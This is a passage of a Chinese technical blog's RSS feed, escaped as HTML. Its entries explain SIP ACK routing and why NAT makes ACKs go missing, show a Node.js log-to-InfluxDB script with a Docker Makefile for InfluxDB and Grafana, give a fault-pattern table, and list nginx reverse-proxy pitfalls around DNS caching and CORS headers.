&lt;h1 id=&#34;ack如何路由&#34;&gt;ACK如何路由&lt;/h1&gt;
&lt;p&gt;ack是序列化请求，所谓序列化请求，是指sip to 字段中已经有tag。有to tag是到达对端的唯一标志。&lt;/p&gt;
&lt;p&gt;没有to tag请求称为初始化请求，有totag称为序列化请求。&lt;/p&gt;
&lt;p&gt;初始化请求做路径发现，往往需要做一些数据库查询，DNS查询。而序列化请求不需要查询数据库，因为路径已经发现过了。&lt;/p&gt;
&lt;p&gt;实战场景：分机A, SIP服务器S, 分机B, A呼叫B，详细介绍一下到ACK的过程。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;分机A向SIP服务器S发送请求：INVITE B&lt;/li&gt;
&lt;li&gt;SIP服务器
&lt;ol&gt;
&lt;li&gt;首先在数据库中查找B的实际注册地址&lt;/li&gt;
&lt;li&gt;修改Contact头为分机A的外网地址和端口。因为由于存在NAT, 分机A一般不知道自己的公网地址。&lt;/li&gt;
&lt;li&gt;record_route&lt;/li&gt;
&lt;li&gt;将消息发送给B&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;分机B:
&lt;ol&gt;
&lt;li&gt;收到来自SIP服务器的INVITE消息&lt;/li&gt;
&lt;li&gt;从INVITE中取出Contact, 获取对端的，其实也就是分机A的实际地址&lt;/li&gt;
&lt;li&gt;如果所有条件都满足，分机B会向SIP服务器发送180响应，然后发送200响应&lt;/li&gt;
&lt;li&gt;由于180响应和200响应和INVITE都属于一个事务，响应会按照Via的地址，先发送给SIP服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;SIP服务器：
&lt;ol&gt;
&lt;li&gt;SIP服务器会首先修改180响应的Contac头，把分机B的内网地址改为外网地址&lt;/li&gt;
&lt;li&gt;SIP服务器根据Via头，将消息发送给分机A&lt;/li&gt;
&lt;li&gt;对于200 OK的消息，和180的处理是相同的&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;分机A:
&lt;ol&gt;
&lt;li&gt;分机收到180消息后，从Contact头中能够获取分机B的外网地址&lt;/li&gt;
&lt;li&gt;分机A在发送ACK时，request url地址是分机B的地址，但是由于sip服务器的record_route动作首先会将消息发送给SIP服务器，SIP服务器会按照request url的地址，将ack发送给分机B。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;ACK的路由不需要做数据库查询，ACK的request url一般是对端UAC的地址。在存在route头时，ACK会按照route字段去路由。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;ack丢失了会怎样&#34;&gt;ACK丢失了会怎样？&lt;/h1&gt;
&lt;p&gt;如果被叫在一定时间内没有收到ACK, 那么被叫会周期性的重发200OK。如果在超时的时候，还没有收到ACK, 就发发送BYE消息来挂断呼叫。很多呼叫在&lt;strong&gt;30秒自动挂断&lt;/strong&gt;，往往就是因为丢失了ACK。&lt;/p&gt;
&lt;p&gt;那么ACK为什么会丢失呢？&lt;!-- raw HTML omitted --&gt;可能有以下的原因，&lt;strong&gt;大部分原因和NAT有关！&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SIP服务器没有做fix_nat_contact, 导致主叫可能不知道实际被叫的外网地址&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;ack与媒体流的关系&#34;&gt;ACK与媒体流的关系&lt;/h1&gt;
&lt;p&gt;并不是说被叫收到ACK后，媒体流才开始。往往在180或者183时，双方已经能够听到对方的声音了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>我的数据可视化处理过程</title>
      <link>https://wdd.js.org/posts/2020/02/mrgkvf/</link>
      <pubDate>Sun, 16 Feb 2020 14:55:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/02/mrgkvf/</guid>
      <description>&lt;h1 id=&#34;数据规整&#34;&gt;数据规整&lt;/h1&gt;
&lt;p&gt;我的数据来源一般都是来自于日志文件，不同的日志文件格式可能都不相同。所以第一步就是把数据抽取出来，并且格式化。&lt;/p&gt;
&lt;p&gt;一般情况下我会用grep或者awk进行初步的整理。如果shell脚本处理不太方便，通常我会写个js脚本。&lt;/p&gt;
&lt;p&gt;Node.js的readline可以实现按行取出。处理过后的输出依然是写文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readline&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readline&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dayjs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dayjs&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data.log&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;batch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dayjs&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;format&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;MMDDHHmmss&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dist&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createWriteStream&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fileName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.out`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readline&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createInterface&lt;/span&gt;({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createReadStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fileName&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;line&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;handlerLine&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handlerLine&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;split&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dayjs&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`2020-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;valueOf&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`rtpproxy,tag=b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;batch&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; socket=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,mem=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;000000\n`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;dist&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;write&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出的文件格式如下，至于为什么是这种格式，且看下文分晓。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rtpproxy&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b0216014954&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;691&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;mem&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3106936&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1581477499000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rtpproxy&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b0216014954&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;615&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;mem&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3109328&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1581477648000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rtpproxy&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b0216014954&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;669&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;mem&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3113764&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1581477901000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rtpproxy&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b0216014954&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;701&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;mem&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3114820&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1581477961000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;数据导入&#34;&gt;数据导入&lt;/h1&gt;
&lt;p&gt;以前我都会把数据规整后的输出写成一个JSON文件，然后写html页面，引入Echarts库，进行数据可视化。&lt;/p&gt;
&lt;p&gt;但是这种方式过于繁琐，每次都要写个Echars的Options。&lt;/p&gt;
&lt;p&gt;所以我想，如果把数据写入influxdb，然后用grafana去做可视化，那岂不是十分方便。&lt;/p&gt;
&lt;p&gt;所以，我们要把数据导入influxdb。&lt;/p&gt;
&lt;h1 id=&#34;启动influxdb-grafana&#34;&gt;启动influxdb grafana&lt;/h1&gt;
&lt;p&gt;下面是一个Makefile， 用来启动容器。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;make create-network 用来创建两个容器的网络，这样grafana就可以通过容器名访问influxdb了。&lt;/li&gt;
&lt;li&gt;make run-influxdb 启动influxdb，其中8086端口是influxdb对外提供服务的端口&lt;/li&gt;
&lt;li&gt;make run-grafana 启动grafana, 其中3000端口是grafana对外提供服务的端口&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;run-influxdb&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker run -d -p 8083:8083 -p 8086:8086 --network b2 --name influxdb  influxdb:latest
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;run-grafana&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker run -d --name grafana --network b2  -p 3000:3000 grafana/grafana
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;create-network&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker network create -d bridge --ip-range&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.1.0/24 --gateway&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.1.1 --subnet&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.1.0/24 b2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;
&lt;p&gt;接着你打开localhost:3000端口，输入默认的用户名密码 admin/amdin来登录&lt;/p&gt;</description>
    </item>
    <item>
      <title>故障的特征分析方法</title>
      <link>https://wdd.js.org/posts/2020/02/rx59i2/</link>
      <pubDate>Fri, 14 Feb 2020 20:08:17 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/02/rx59i2/</guid>
      <description>&lt;h1 id=&#34;特征维度&#34;&gt;特征维度&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;特征项&lt;/th&gt;
          &lt;th&gt;集中&lt;/th&gt;
          &lt;th&gt;无规律&lt;/th&gt;
          &lt;th&gt;周期性&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;时间&lt;/td&gt;
          &lt;td&gt;集中在某个时间点发生&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;按固定时间间隔发生&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;空间&lt;/td&gt;
          &lt;td&gt;集中在某个空间发生&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;人物&lt;/td&gt;
          &lt;td&gt;集中在某个人物身上发生&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>我走过的nginx反向代理的坑</title>
      <link>https://wdd.js.org/posts/2020/02/ngse8g/</link>
      <pubDate>Thu, 13 Feb 2020 21:21:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/02/ngse8g/</guid>
      <description>&lt;p&gt;下文的论述都以下面的配置为例子&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location ^~ /p/security &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  rewrite /p/security/&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;.*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /security/$1  break;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_pass         http://security:8080;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_redirect     off;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_set_header   Host $host;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access-Control-Allow-Origin&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt; always;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access-Control-Allow-Credentials&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; always;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;如果dns无法解析，nginx则无法启动&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;security如果无法解析，那么nginx则无法启动&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DNS缓存问题：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;nginx启动时，如果将security dns解析为1.2.3.4。如果security的ip地址变了。nginx不会自动解析新的ip地址，导致反向代理报错504。&lt;/li&gt;
&lt;li&gt;反向代理的DNS缓存问题务必重视&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨域头配置的always&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;反向代理一般都是希望允许跨域的。如果不加always，那么只会对成功的请求加跨域头，失败的请求则不会。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于**&amp;lsquo;Access-Control-Allow-Origin&amp;rsquo; &amp;lsquo;*&amp;rsquo;，如果后端服务本身就带有这个头，那么如果你在nginx中再添加这个头，就会在浏览器中遇到下面的报错。而解决办法就是不要在nginx中设置这个头。**&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Access to fetch at &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://192.168.40.107:31088/p/security/v2/login&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from origin &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://localhost:5000&amp;#39;&lt;/span&gt; has been blocked by CORS policy:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Response to preflight request doesn&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t pass access control check: 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The &amp;#39;&lt;/span&gt;Access-Control-Allow-Origin&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; header contains multiple values &amp;#39;&lt;/span&gt;*, *&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but only one is allowed. Have the server send the header with a valid value, 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;or, if an opaque response serves your needs, set the request&amp;#39;&lt;/span&gt;s mode to 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no-cors&amp;#39;&lt;/span&gt; to fetch the resource with CORS disabled.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考链接&#34;&gt;参考链接&lt;/h1&gt;
